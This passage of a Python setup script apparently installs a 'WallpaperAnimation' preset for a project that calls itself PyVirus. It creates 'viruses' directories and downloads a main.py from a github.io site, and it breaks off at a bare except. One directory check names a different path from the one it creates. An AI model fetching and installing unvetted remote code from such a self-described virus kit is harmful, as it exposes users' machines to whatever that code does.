...
if not os.path.isdir("viruses/preset/viruses/preset/WallpaperAnimation"):
 os.mkdir("viruses/preset/WallpaperAnimation")
print("directories created")
print("downloading files")
try:
 if not os.path.isdir("viruses/preset/WallpaperAnimation/animations"):
  os.mkdir("viruses/preset/WallpaperAnimation/animations")
 download_file("https://pyvirus123.github.io/PyVirus/viruses/preset/WallpaperAnimation/main.py", "viruses/preset/WallpaperAnimation/main.py")
except:
